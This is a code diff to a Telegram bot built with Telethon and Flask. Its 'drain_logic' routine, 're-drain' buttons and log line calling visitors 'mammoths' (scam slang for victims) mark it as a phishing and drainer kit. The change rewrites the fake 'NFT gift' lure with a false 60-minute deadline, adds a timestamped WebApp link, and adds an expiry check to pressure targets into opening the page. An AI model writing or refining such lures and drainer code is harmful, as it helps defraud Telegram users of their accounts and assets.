@@ -3,6 +3,7 @@ import asyncio
 import threading
 import urllib.parse
 import datetime
+import time # Добавлено для отслеживания времени
 from flask import Flask, render_template, request, jsonify
 from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
@@ -106,10 +107,9 @@ async def drain_logic(client, phone):
         btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
         send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)
 
-# --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ) ---
+# --- ИНЛАЙН РЕЖИМ (С ЛОГИКОЙ 60 МИНУТ) ---
 @bot.on(events.InlineQuery)
 async def inline_handler(event):
-    # 1. Проверка доступа
     if event.sender_id not in get_trusted():
         await event.answer(
             [], 
@@ -118,7 +118,6 @@ async def inline_handler(event):
         )
         return
 
-    # 2. Обработка пустого ввода или текста без ссылки
     if not event.text or not event.text.strip().startswith("http"):
         await event.answer(
             [],
@@ -127,29 +126,34 @@ async def inline_handler(event):
         )
         return
 
-    # 3. Если ссылка введена
     input_text = event.text.strip()
     try:
         nft_name = input_text.split('/')[-1].replace('-', ' ').title()
     except:
         nft_name = "NFT Gift"
 
-    # Формируем URL для WebApp
-    web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}"
+    # Добавляем временную метку в ссылку
+    timestamp = int(time.time())
+    web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
     
-    # В Telethon для инлайна WebApp кнопка создается через types.KeyboardButtonWebView
-    # Но проще и надежнее для инлайна использовать стандартный builder
     builder = event.builder
     
     await event.answer([
         builder.article(
-            title=f"🎁 Подарить подарок: {nft_name}",
-            description="Нажмите, чтобы отправить этот подарок",
-            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`\n\nНажмите кнопку ниже, чтобы принять 👇",
+            title=f"🎁 Отправить подарок: {nft_name}",
+            description="Лимит времени на принятие: 60 минут",
+            text=(
+                f"🎁 **Вам дарят NFT: {nft_name}**\n\n"
+                "Учтите, что подарок можно принять только с аккаунта, на "
+                "который был отправлен данный подарок. Ссылка действительна "
+                "**60 минут** с момента получения.\n\n"
+                "Для принятия нажмите кнопку ниже.\n\n"
+                f"{input_text}"
+            ),
+            link_preview=True,
             buttons=[
-                # Для инлайна Telethon используем специальный тип кнопки
-                [types.KeyboardButtonWebView("Принять подарок 🎁", web_url)],
-                [Button.url("Посмотреть на Getgems", input_text)]
+                [types.KeyboardButtonWebView("🎁 Забрать NFT", web_url)],
+                [Button.url("Посмотреть подарок", input_text)] # Ссылка на сам NFT подарок
             ]
         )
     ])
@@ -202,6 +206,15 @@ async def redrain_callback(event):
 @app.route('/')
 def index(): 
     target = request.args.get('nft_url', 'Главная')
+    t_param = request.args.get('t')
+    
+    # Проверка истечения 60 минут
+    if t_param:
+        try:
+            if int(time.time()) - int(t_param) > 3600:
+                return "<h1>Срок действия ссылки истек (60 минут)</h1>", 403
+        except: pass
+
     send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
     return render_template('index.html')
 
